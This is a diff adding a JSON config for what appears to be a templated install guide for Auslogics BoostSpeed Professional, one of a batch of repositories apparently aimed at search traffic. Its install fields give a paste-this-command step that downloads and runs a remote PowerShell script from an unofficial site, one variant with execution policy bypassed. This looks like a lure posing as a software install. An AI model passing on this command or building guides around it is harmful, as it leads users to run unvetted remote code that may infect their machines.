@@ -1,0 +1,25 @@
+{
+  "repo": "auslogics-boostspeed-professional-edition",
+  "product": "Auslogics BoostSpeed Professional Edition",
+  "product_title": "auslogics",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-part1",
+  "format": "license-md-toolix-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "auslogics-boostspeed",
+    "how-to-install-auslogics-boostspeed",
+    "how-to-setup-auslogics-boostspeed",
+    "desktop-package",
+    "windows-11",
+    "windows-10",
+    "pc-optimization",
+    "registry-cleaner",
+    "system-tuneup"
+  ],
+  "site": "toolix.me"
+}
